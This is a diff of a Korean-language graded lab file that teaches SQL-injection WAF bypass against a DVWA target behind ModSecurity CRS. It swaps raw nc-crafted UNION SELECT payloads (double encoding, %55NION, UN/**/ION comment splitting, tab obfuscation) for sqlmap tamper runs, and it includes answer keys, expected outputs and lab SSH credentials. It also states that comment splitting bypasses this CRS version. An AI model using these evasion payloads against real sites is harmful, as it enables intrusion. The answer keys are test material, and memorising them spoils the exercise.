@@ -70,7 +70,7 @@ steps:
       semantic:
         intent: "대상 점검"
         success_criteria: ["도달"]
-        acceptable_methods: ["**[OSS] nc raw HTTP / whatweb (권장)**"]
+        acceptable_methods: ["**[OSS] whatweb 도달성 (권장)**"]
     target_vm: web
 
   - order: 2
@@ -88,34 +88,37 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      echo "plain=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
+      # baseline — 진짜 SQLi 도구 sqlmap의 평문 페이로드 → 차단형 dvwa는 WAF가 전부 403(우회 평가의 기준선)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
       ```
-      plain=403 이면 평문 UNION SQLi 가 CRS 942→949110 으로 차단된 것 = 이 403 이 우회 평가의 기준선(baseline)이다.
+      sqlmap 의 평문 SQLi 페이로드가 전부 403 으로 막히고 'WAF/IPS 로 보호됨' + '403 (Forbidden) - N times' 로
+      보고되면, CRS 942→949110 차단이 확인된 것 = 이 WAF 차단이 우회 평가의 기준선(baseline)이다.
       > 💡 **화면으로 확인:** GET 요청이라 브라우저 주소창에 `http://dvwa.el34.lab/?id=1' UNION SELECT 1--` 를
       > 열면 **403 페이지**가 뜬다. 이후 우회 변형은 페이로드를 조금씩 바꿔 되쏘는 작업이라 **Burp Repeater** 가 편하다.
       - `id=1%27%20UNION%20SELECT%201--`(`%27`='`', `%20`=공백) = 평문 `1' UNION SELECT 1--`. 변형 없는 전형적 UNION SQLi → CRS 942 가 곧장 잡음.
 
       ## ✅ 합격 기준
-      `403` 출력 시 통과. **근거:** 평문 SQLi 의 응답이 403(WAF 차단=baseline)이면 통과 — 이 403 이
-      이후 우회 시도의 기준선이다.
-    hint: '평문 UNION → 403'
+      `403` 출력 시 통과. **근거:** sqlmap 의 평문 SQLi 가 dvwa 에서 WAF 에 막혀 '403 (Forbidden)'로
+      보고되면 통과 — 이 WAF 차단이 이후 tamper 우회 시도의 기준선(baseline)이다.
+    hint: 'sqlmap 평문 SQLi → WAF 403'
     category: manipulation
     points: 12
     answer: |
-      # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      echo "plain=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
-    answer_detail: "baseline = 평문 SQLi → 403. 변형 없는 UNION SELECT 가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). 이후 우회 기법이 이 차단을 200 으로 통과시키는지가 본 주차의 관건."
+      # baseline — sqlmap 평문 SQLi → 차단형 dvwa는 WAF가 전부 403(기준선)
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "baseline = 진짜 SQLi 도구 sqlmap의 평문 페이로드 → WAF 403. 변형 없는 UNION SELECT 계열 probe가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). sqlmap 스스로 'WAF/IPS 로 보호된다'고 감지하고 '--tamper'를 권하며 '403 (Forbidden) - N times'로 보고한다. 이후 tamper 우회 기법이 이 WAF 차단을 넘는지가 본 주차의 관건."
     expected_output: |
-      plain=403
+      [09:11:24] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:11:26] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+      403 (Forbidden) - 75 times
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: "기준 공격 baseline"
-        success_criteria: ["평문 SQLi 403"]
-        acceptable_methods: ["**[OSS] 평문 SQLi (권장)**"]
+        intent: "기준 공격 baseline(sqlmap WAF 차단)"
+        success_criteria: ["평문 SQLi WAF 403"]
+        acceptable_methods: ["**[OSS] sqlmap 평문 SQLi (권장)**"]
     target_vm: web
 
   - order: 3
@@ -133,104 +136,95 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      echo "dbl=$(echo -en 'GET /?id=1%2527%20UNION%20SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
-      # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      echo "mix=$(echo -en 'GET /?id=1%27%20%55NION%20%53ELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
+      # 인코딩 우회 자동화 — sqlmap --tamper=charunicodeencode(모든 문자를 유니코드 인코딩; charencode도 동일 계열)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=charunicodeencode --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
       ```
-      dbl·mix 이 대부분 여전히 403 이면 인코딩 우회가 실패한 것 — CRS 가 `t:urlDecodeUni` 로 먼저 디코드한
-      뒤 검사해 원형 UNION SELECT 로 되돌리기 때문이다("디코드 전 검사" 가정이 깨짐).
+      sqlmap 이 인코딩 tamper(charunicodeencode)를 로드해 모든 문자를 유니코드로 인코딩해 던져도 dvwa 는
+      여전히 403 — CRS 가 `t:urlDecodeUni` 로 **먼저 디코드한 뒤** 검사해 원형 UNION SELECT 로 되돌리기
+      때문이다("디코드 전 검사" 가정이 깨짐). 이중 인코딩(%2527)·부분 인코딩(%55NION)도 같은 이유로 무력하다.
       > 💡 **Burp Repeater 로도 동일:** `?id=` 값만 `%2527`·`%55NION` 등으로 바꿔 Send 하면 응답 코드가 바로
       > 보인다 — 인코딩을 한 글자씩 바꿔 되쏘는 우회 탐색엔 Burp Repeater 가 nc 단발 반복보다 빠르다.
       - `%2527`=이중 인코딩(`%`를 `%25`로 한 번 더 → `%2527`→`%27`→`'`), `%55`=`U`/`%53`=`S`(부분 URL 인코딩 → UNION SELECT).
 
       ## ✅ 합격 기준
-      `403` 출력 시 통과. **근거:** 인코딩 변형의 응답이 대부분 여전히 403(우회 실패)이면 통과 —
-      CRS 가 디코드 후 잡는다(디코드-전-검사 가정이 깨짐).
-    hint: '이중인코딩 %2527, %55NION'
+      `403` 출력 시 통과. **근거:** sqlmap 의 인코딩 tamper(charunicodeencode) 시도가 여전히 403(우회 실패)이면
+      통과 — CRS 가 t:urlDecodeUni 로 디코드한 뒤 잡는다(디코드-전-검사 가정이 깨짐).
+    hint: 'sqlmap --tamper=charunicodeencode'
     category: manipulation
     points: 12
     answer: |
-      # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      echo "dbl=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%2527%20UNION%20SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
-      # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      echo "mix=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20%55NION%20%53ELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
-    answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(%55=U, %2527=이중인코딩→'). 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(대부분 403)."
+      # 인코딩 우회 자동화 — sqlmap --tamper=charunicodeencode → CRS urlDecodeUni 정규화로 여전히 403
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=charunicodeencode --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(유니코드·이중인코딩 %2527→'·부분 인코딩 %55=U). sqlmap의 인코딩 tamper(charunicodeencode)로 모든 문자를 유니코드 인코딩해 자동 발사한다. 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(여전히 403). sqlmap이 tamper를 로드해도 스캐너 probe 총합이 anomaly에 걸린다."
     expected_output: |
-      dbl=403
-      mix=403
+      [09:43:53] [INFO] loading tamper module 'charunicodeencode'
+      [09:43:53] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:43:55] [ERROR] all tested parameters do not appear to be injectable...
+      403 (Forbidden) - 76 times
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: "인코딩 우회 시도 + 정규화"
-        success_criteria: ["인코딩 시도", "정규화로 차단"]
-        acceptable_methods: ["**[OSS] 인코딩 payload (권장)**"]
+        intent: "인코딩 tamper 우회 시도 + 정규화"
+        success_criteria: ["sqlmap 인코딩 tamper", "정규화로 차단"]
+        acceptable_methods: ["**[OSS] sqlmap --tamper 인코딩 (권장)**"]
     target_vm: web
 
   - order: 4
     instruction: |
       ## 🎯 목표
-      인코딩과 결이 다른 우회 — 키워드의 형태를 흐트러뜨리는 **분할·난독화**(주석 삽입·탭 공백)로
-      변형해 던지고, **무엇이 막히고 무엇이 뚫리는지** 실측으로 확인한다.
+      인코딩과 결이 다른 우회 — 키워드의 형태를 흐트러뜨리는 **분할·난독화**(주석 삽입·탭 공백)를
+      sqlmap 의 tamper 스크립트로 자동 시도하고, 자동 스캐너가 이 CRS 를 넘는지 확인한다.
 
       ## 📖 개념 한 줄
       분할·난독화는 문자를 다르게 적는 게 아니라 키워드 **형태**를 쪼갠다. CRS 의
-      `t:compressWhitespace` 는 탭 분할을 복원해 차단(403)하지만, 이 CRS 3.3.2 의 SQLi 탐지
-      (libinjection)는 주석 분할(`UN/**/ION`)을 복원하지 못해 **실제로 우회(302)** 된다(lecture §3, §4).
+      `t:compressWhitespace`·`t:lowercase` 는 탭·대소문자 변형을 복원해 차단(403)하고, 주석 분할
+      (`UN/**/ION`)은 libinjection 빈틈이라 **단발 수작업 payload 는 우회(302)** 가능하나, sqlmap 처럼
+      수십 발을 쏘는 **자동 스캐너는 tamper 를 써도** 그 총합이 942 에 걸려 여전히 차단된다(lecture §3, §4).
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "cmt=$C"
-      # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(echo -en 'GET /?id=1%27%09UNION%09SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "tab=$T"
-      # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
-      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
-      # 4) 대조 — 탭 분할은 compressWhitespace로 복원돼 차단(403)
-      echo "→ 대조: 탭 분할(tab=$T)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다"
+      # 분할/난독화 우회 자동화 — sqlmap --tamper=space2comment(공백→/**/ 주석분할; UN/**/ION 형태)
+      sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'
       ```
-      > 💡 **화면으로 확인(핵심):** 주석분할이 우회에 성공하면 응답이 403 이 아니라 **302**(백엔드로 통과)다 —
-      > **Burp Repeater** 로 `UN/**/ION` 페이로드를 보내 응답 코드가 302 로 바뀌는 순간을 직접 본다(차단 403 과 대조).
-      - 주석 삽입(`/**/`로 키워드 사이 쪼갬 — libinjection 미복원→우회), 탭(`%09` — compressWhitespace 복원→차단), 케이스(`UnIoN` — lowercase 복원→차단).
+      sqlmap 이 space2comment tamper 로 공백을 `/**/`(주석)으로 바꿔 주석분할을 자동 시도하지만, 스캐너는
+      여전히 403 — sqlmap 은 수십 개 probe(작은따옴표·괄호·키워드)를 함께 쏘고 CRS anomaly scoring 이 그
+      총합을 잡기 때문이다. 개념: 손으로 정밀하게 만든 **단 하나**의 주석분할 payload(`UN/**/ION`, raw 요청)는
+      이 CRS 3.3.2 의 libinjection 이 토큰을 못 복원해 통과(302)할 수 있으나, 자동 스캐너는 재인코딩·다른
+      probe 로 결국 942 에 걸린다 — 실전 우회는 자동화가 아니라 수작업 정밀도가 관건이다.
+      > 💡 **개념(수작업 vs 자동):** 손으로 만든 단발 `UN/**/ION` payload 를 **Burp Repeater** 로 정밀하게
+      > 보내면 응답이 403 이 아니라 **302**(libinjection 빈틈으로 백엔드 통과)가 될 수 있다 — 그러나 sqlmap 같은
+      > 자동 스캐너는 그 한 발이 아니라 수십 발을 쏘아 결국 942 에 걸린다(자동화 ≠ 은밀).
+      - 주석 삽입(`/**/`로 키워드 사이 쪼갬 — libinjection 미복원, 단발 수작업은 우회 가능), 탭(`%09` — compressWhitespace 복원→차단), 케이스(`UnIoN` — lowercase 복원→차단).
 
       ## ✅ 합격 기준
-      `우회 성공` 출력 시 통과. **근거:** 탭 분할(tab=403)은 t:compressWhitespace 로 차단되지만 주석분할
-      (cmt=302)은 libinjection 이 못 복원해 우회한다 — 두 결과의 대조로 정규화의 한계를 확인.
-    hint: 'UN/**/ION 주석, %09 탭'
+      `tamper` 출력 시 통과. **근거:** sqlmap 이 space2comment tamper(주석분할)를 로드해 우회를 자동 시도하고
+      그 결과(여기선 여전히 403 차단)를 보고하면 통과 — 자동 스캐너는 tamper 로도 CRS anomaly 를 넘기 어렵고,
+      단발 주석분할의 정밀 우회(302)는 수작업 몫이다(libinjection 빈틈).
+    hint: 'sqlmap --tamper=space2comment'
     category: manipulation
     points: 12
     answer: |
-      # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
-      echo "cmt=$C"
-      # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%09UNION%09SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
-      echo "tab=$T"
-      # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
-      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
-      # 4) 대조 — 탭 분할은 compressWhitespace로 복원돼 차단(403)
-      echo "→ 대조: 탭 분할(tab=$T)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다"
-    answer_detail: "분할/난독화 = 문자가 아니라 키워드 형태를 흐트러뜨리기. 탭(%09)은 t:compressWhitespace 가, 대소문자(UnIoN)는 t:lowercase 가 복원해 차단(403). 그러나 주석 분할(UN/**/ION)은 이 CRS 3.3.2 의 libinjection 이 토큰을 복원하지 못해 실제로 302 우회된다 — 판정은 주석분할이 차단(403)이 아닌 우회임을 게이트한다(탭 차단·주석 우회의 대조)."
+      # 분할/난독화 우회 자동화 — sqlmap --tamper=space2comment(주석분할) → 스캐너는 여전히 403
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=1 --risk=1 --flush-session --tamper=space2comment --disable-coloring 2>&1 | grep -iE 'loading tamper|WAF/IPS|do not appear to be injectable|403 \(Forbidden\)'"
+    answer_detail: "분할/난독화 = 문자가 아니라 키워드 형태를 흐트러뜨리기(주석분할 UN/**/ION, 탭 %09, 대소문자 UnIoN). sqlmap의 space2comment tamper로 공백을 /**/(주석)으로 바꿔 주석분할을 자동 시도한다. 탭·대소문자는 CRS의 t:compressWhitespace·t:lowercase가 복원해 차단, 주석분할은 이 CRS 3.3.2의 libinjection이 토큰을 복원 못 해 '단발 수작업 payload'는 302 통과 가능하나, sqlmap 같은 자동 스캐너는 수십 개 probe(작은따옴표·괄호)를 함께 쏘아 CRS anomaly에 걸려 여전히 403이다 — 자동화 ≠ 은밀. 채점은 출력에 'tamper'(모듈 로드)가 보이는지로 판정한다(정밀 302 우회는 수작업 몫)."
     expected_output: |
-      cmt=302
-      tab=403
-      → 주석분할 우회 성공(cmt=302): libinjection이 주석분할을 못 복원
-      → 대조: 탭 분할(tab=403)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다
+      [09:13:09] [INFO] loading tamper module 'space2comment'
+      [09:13:09] [INFO] checking if the target is protected by some kind of WAF/IPS
+      [09:13:11] [ERROR] all tested parameters do not appear to be injectable...
+      403 (Forbidden) - 76 times
     verify:
       type: output_contains
-      expect: '우회 성공'
+      expect: 'tamper'
       field: stdout
       semantic:
-        intent: "분할/난독화 — 탭 차단 vs 주석분할 우회 대조"
-        success_criteria: ["탭 403 차단", "주석분할 302 우회"]
-        acceptable_methods: ["**[OSS] 주석/탭 변형별 응답 비교 (권장)**"]
+        intent: "분할/난독화 tamper 자동 우회 + CRS 차단"
+        success_criteria: ["sqlmap space2comment tamper", "스캐너도 CRS에 403"]
+        acceptable_methods: ["**[OSS] sqlmap --tamper 주석분할 (권장)**"]
     target_vm: web
 
   - order: 5
